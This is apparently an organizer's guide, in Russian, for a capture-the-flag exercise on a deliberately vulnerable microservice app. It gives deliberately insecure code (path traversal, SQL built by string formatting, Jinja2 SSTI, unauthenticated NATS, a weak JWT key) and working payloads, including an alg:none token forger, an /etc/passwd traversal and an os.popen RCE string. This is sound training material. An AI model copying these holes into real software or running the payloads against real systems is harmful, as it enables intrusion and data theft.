# 📋 РУКОВОДСТВО ОРГАНИЗАТОРА CTF
## Operation Shoulder Takeover

## Быстрый старт

### 1. Подготовка окружения (30 минут)

```bash
# Скопируйте .env.example в .env
cp .env.example .env

# Отредактируйте критические значения для CTF режима:
# В .env:
ENVIRONMENT=development  # Включить debug
DEBUG=true
SECRET_KEY=CHANGE_ME_GENERATE_64_RANDOM_CHARS  # Слабый ключ для CTF
ALGORITHM=HS256

# Запустите систему:
docker-compose up -d

# Проверьте что все сервисы запущены:
docker-compose ps
```

### 2. Инициализация данных (20 минут)

```bash
# Создайте тестовых пользователей:

# Superuser (admin)
curl -X POST http://localhost:8005/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "phone_number": "+79991000001",
    "password": "admin123!",
    "email": "admin@s2s_sports.local",
    "display_name": "Admin"
  }'

# Moderator
curl -X POST http://localhost:8005/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "phone_number": "+79991000002",
    "password": "mod123!",
    "email": "moderator@s2s_sports.local",
    "display_name": "Moderator"
  }'

# Regular users (для других участников)
# ... повторить для нескольких пользователей
```

### 3. Создание компрометирующих данных

```bash
# Создайте события для событиях:
TOKEN="<admin_token>"

curl -X POST http://localhost:8005/api/v1/events \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Коррупционная схема #1",
    "description": "Фальшивое событие для отмывки денег",
    "spot_id": 1,
    "max_participants": 5,
    "start_time": "2026-02-15T10:00:00Z",
    "end_time": "2026-02-15T11:00:00Z"
  }'

# Загружайте файлы с компрометирующей информацией:
curl -X POST http://localhost:8005/api/v1/media/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "purpose=avatar" \
  -F "owner_id=<admin_id>" \
  -F "file=@admin_bank_statement.pdf"
```

### 4. Установка флагов

Флаги размещаются в следующих местах:

#### Флаг 1: Endpoints Enumeration
```python
# В response от /health всех сервисов
{
  "status": "ok",
  "service": "gateway",
  "flag": "architecture_enumeration_completed_gateway_admin_service_found"
}
```

#### Флаг 2: Debug Error Messages
```python
# Configure в gateway main.py:
@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    # Для development - выводить stack trace:
    if settings.DEBUG:
        return JSONResponse(
            status_code=500,
            content={
                "detail": str(exc),
                "traceback": traceback.format_exc(),
                "flag": "debug_error_messages_exposed_db_version_8_6_detected"
            }
        )
```

#### Флаг 3: Registration Token
```python
# В response от POST /auth/register:
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "flag": "registered_fake_user_token_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
}
```

#### Флаги 4-20: Встроены в использование уязвимостей

---

## 🔧 Детальные шаги для каждой уязвимости

### Flagment 6: Path Traversal в Media Service

**Проблема:** File_name parameter не валидируется

**Решение:**
```python
# В backend/media_service/app/api/v1/media.py
# НЕ добавляем защиту:

# НЕПРАВИЛЬНО (защита которую УДАЛЯЕМ):
# if ".." in file_name or file_name.startswith("/"):
#     raise HTTPException(400, "Invalid path")

# Так ДОЛЖНО быть (уязвимо):
@router.get("/avatar/{owner_id}/{file_name:path}")
async def get_avatar(owner_id: str, file_name: str):
    file_key = f"avatar/{owner_id}/{file_name}"  # Уязвимо!
    obj = s3.get_object(file_key)
    return StreamingResponse(obj["Body"].iter_chunks())
```

**Тест:**
```bash
# Это должно работать и вернуть файл другого пользователя:
curl "http://localhost:8005/api/v1/media/avatar/00000000-0000-0000-0000-000000000002/../00000000-0000-0000-0000-000000000001/avatar.png"
```

### Flag 7: NATS Message Injection

**Проблема:** NATS не требует аутентификацию между сервисами

**Решение:**
```python
# Запустите NATS БЕЗ аутентификации:
# docker-compose.yml:
nats:
  image: nats:2.10-alpine
  command: ["-js", "-m", "8222"]  # НЕ добавляем --auth flag
```

**Тест:**
```bash
# Участник может подключиться к NATS напрямую:
nats context add ctf --server nats://localhost:4222
nats conn info

# Отправить поддельное сообщение:
nats pub "auth.validate_token" '{
  "ok": true,
  "data": {
    "user_id": "00000000-0000-0000-0000-000000000001",
    "role": "superuser",
    "is_active": true
  }
}'
```

### Flag 8: JWT None Algorithm

**Проблема:** JWT библиотека может принимать algorithm: "none"

**Решение:**
```bash
# Используйте jwt.decode с опцией which обрабатывает "none":

# Создайте токен с algorithm: none
python3 << 'EOF'
import json
import base64

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "00000000-0000-0000-0000-000000000001", "role": "superuser"}

header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()

token = f"{header_b64}.{payload_b64}."
print(f"TOKEN: {token}")
EOF

# Используйте этот токен:
curl -H "Authorization: Bearer <token>" http://localhost:8005/api/v1/users/me
```

### Flag 9: Race Condition

**Проблем:** Time-of-check-time-of-use (TOCTOU)

**Решение:**
```bash
# Используйте Apache JMeter:
1. Open JMeter
2. Create Thread Group with 3 threads
3. Add HTTP Request:
   - POST http://localhost:8005/api/v1/events/{event_id}/join
   - Authorization Header
4. Set "Synchronizing Timer" для запуска всех потоков одновременно
5. Run и проверьте что более 1 пользователя присоединилось
```

### Flag 14: SQL Injection

**Проблема:** Параметры в пространственных запросах не санитизированы

**Решение:**
```python
# В backend/maps_service/services/place_service.py:
# УЯЗВИМО (не используется параметризованный запрос):
async def get_nearby_places(lat: float, lon: float, radius_m: float = 2000):
    # Этот запрос составляется через string formatting!
    query = f"""
    SELECT * FROM places 
    WHERE ST_DWithin(
        location, 
        ST_SetSRID(ST_MakePoint({lon}, {lat}), 4326), 
        {radius_m}
    )
    """
    result = await db.execute(query)
    return result
```

**Эксплуатация:**
```bash
# Отправьте SQL injection:
curl "http://localhost:8005/api/v1/places/nearby?lat=55.7558&lon=37.6173&radius=2000%20OR%201=1"

# Или:
curl "http://localhost:8005/api/v1/places/nearby?lat=55.7558&lon=37.6173&radius=2000%3B%20SELECT%20*%20FROM%20users"
```

### Flag 15: SSTI в Email Template

**Проблема:** User input используется прямо в Jinja2 template

**Решение:**
```python
# В notification_service (если используется):
# УЯЗВИМО:
from jinja2 import Template

display_name = user.display_name  # User input!
template_str = f"Hello {{ {display_name} }}!"  # Опасно!
template = Template(template_str)
rendered = template.render()  # SSTI!
```

**Эксплуатация:**
```bash
# Регистрируйтесь с display_name:
"{{ 7 * 7 }}"  # Должно вывести 49 в email или ошибку

"{{ __import__('os').popen('whoami').read() }}"  # RCE
```

---

## 📊 Таблица флагов с координатами

| # | Координаты | HTTP Method | Параметры |
|---|------------|-------------|-----------|
| 1 | /health | GET | - |
| 2 | /invalid_path | GET | - |
| 3 | /auth/register | POST | phone_number, password, email |
| 4 | /users/{admin_uuid} | GET | - |
| 5 | /auth/login | POST | phone_number, password |
| 6 | /media/avatar/{id}/../../../{id}/file | GET | - |
| 7 | NATS pub/sub | - | Message injection |
| 8 | Any endpoint | GET/POST | JWT with alg: none |
| 9 | /events/{id}/join | POST | Simultaneous requests |
| 10 | /admin/users | GET | Superuser token |
| 11 | /events/{id} | PUT | Modified fee_amount |
| 12 | /events/{id}/participants | GET | Extract photo_url |
| 13 | NATS admin.user.award_badge | - | Message injection |
| 14 | /places/nearby | GET | SQL injection in radius |
| 15 | Via email | - | SSTI in display_name |
| 16 | Via file upload | - | Pickled object |
| 17 | /media/*/../../backups/ | GET | Path traversal |
| 18 | Internal Docker network | GET | Direct service call |
| 19 | Frontend URL param | - | XSS payload |
| 20 | Combination | - | All previous |

---

## 🚀 Запуск моделирования

### Вариант 1: Локальное запуск CTF

```bash
# 1. Очистите данные
docker-compose down -v

# 2. Запустите с dev конфигурацией
ENVIRONMENT=development DEBUG=true docker-compose up -d

# 3. Дождитесь инициализации (30-60 секунд):
docker-compose logs -f

# 4. Проверьте что все healthy:
curl http://localhost:8005/health
curl http://localhost:8000/health
curl http://localhost:8001/health
# ... для всех сервисов

# 5. Готово к запуску CTF!
```

### Вариант 2: Удаленное развертывание

```bash
# На сервере:
scp docker-compose.yml .env user@server:/opt/ctf/

ssh user@server

cd /opt/ctf
docker-compose -f docker-compose.yml up -d

# Проверьте что доступно:
curl http://server-ip:8005/health
```

---

## 📋 Контрольный список перед CTF

- [ ] Все сервисы запущены и здоровы (проверить все /health endpoints)
- [ ] SECRET_KEY установлен на слабое значение
- [ ] DEBUG=true в конфигурации
- [ ] NATS запущена без аутентификации
- [ ] SMS верификация выключена в auth service
- [ ] Созданы test пользователи с разными ролями
- [ ] Загружены test файлы в MinIO
- [ ] Database backup файл создан в доступной папке
- [ ] Флаги встроены правильно (проверить каждый)
- [ ] Настроено логирование для отслеживания попыток
- [ ] Подготовлены подсказки для участников
- [ ] Создана система регистрации флагов (например, форма, бот, etc)
- [ ] Настроена таблица лидеров
- [ ] Проведён "smoke test" всех уязвимостей
- [ ] Установлен time limit и уведомления

---

## 🔍 Проверка каждой уязвимости

Запустите этот скрипт перед CTF для проверки что всё работает:

```bash
#!/bin/bash

echo "=== CTF SANITY CHECK ==="

# 1. Check services
echo "1. Checking services..."
for port in 8005 8000 8001 8002 8003 8004 8006; do
  if curl -s http://localhost:$port/health | grep -q "healthy\|ok"; then
    echo "  ✓ Port $port OK"
  else
    echo "  ✗ Port $port FAILED"
  fi
done

# 2. Check registration
echo "2. Testing registration..."
RESPONSE=$(curl -s -X POST http://localhost:8005/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"phone_number":"+79991234567","password":"test123","email":"test@test.com","display_name":"Test"}')

if echo $RESPONSE | grep -q "access_token"; then
  echo "  ✓ Registration works"
  TOKEN=$(echo $RESPONSE | jq -r '.access_token')
else
  echo "  ✗ Registration failed"
fi

# 3. Check path traversal
echo "3. Testing path traversal..."
curl -s "http://localhost:8005/api/v1/media/avatar/test/../../../etc/passwd" > /dev/null &&
echo "  ✓ Path traversal accessible" ||
echo "  ✗ Path traversal blocked"

# 4. Check NATS connectivity
echo "4. Testing NATS..."
nats conn info &>/dev/null &&
echo "  ✓ NATS accessible" ||
echo "  ✗ NATS not accessible"

# 5. Check error messages
echo "5. Testing error messages..."
curl -s "http://localhost:8005/invalid" | grep -q "traceback\|error" &&
echo "  ✓ Error messages verbose" ||
echo "  ✗ Error messages hidden"

echo ""
echo "=== CHECK COMPLETE ==="
```

---

## 📞 Поддержка участников

### Примеры подсказок для разных уровней:

**Уровень Easy (Начинающие):**
- "Попробуйте использовать curl для GET запроса к /health"
- "Посмотрите header'ы ответа для CORS информации"
- "Флаг обычно имеет формат FLAG{...}"

**Уровень Medium (Опытные):**
- "Подумайте о том, какие параметры API могут быть уязвимы"
- "Используйте Burp Suite для перехвата и анализа запросов"
- "Исследуйте микросервисную архитектуру"

**Уровень Hard (Профессионалы):**
- "Подумайте о race conditions в асинхронном коде"
- "Проанализируйте как сервисы взаимодействуют через NATS"
- "Message bus может быть вектором атаки"

### Система подсказок в дискорде/телеграме:

```
!hint 1         - Легкая подсказку для этапа 1
!hint 1 medium  - Среднюю подсказку
!hint 1 hard    - Сложную подсказку
!progress       - Показать текущий прогресс
!leaderboard    - Показать таблицу лидеров
!flag FLAG{...} - Сабмит флага
```

---

## 🎓 Обучение после CTF

После завершения CTF проведите:

1. **Разборку (30 мин):**
   - Покажите как был решен каждый этап
   - Объясните почему так происходит
   - Дайте рекомендации по защите

2. **Workshop (1 час):**
   - Как написать secure код
   - Best practices микросервисной архитектуры
   - Tools для testing

3. **Документирование:**
   - Создайте write-up для всех решений
   - Опубликуйте как обучающий материал
   - Соберите feedback от участников

---

## 📈 Метрики успеха

| Метрика | Целевое значение |
|---------|-----------------|
| % участников которые решили Flag 1-5 | >80% |
| % участников которые решили Flag 10+ | 30-50% |
| % участников которые решили все флаги | 10-20% |
| Average time per flag | 5-15 мин |
| Most challenging flag | Flag 20 |
| Most discovered vulnerability | Flag 3,4,6 |

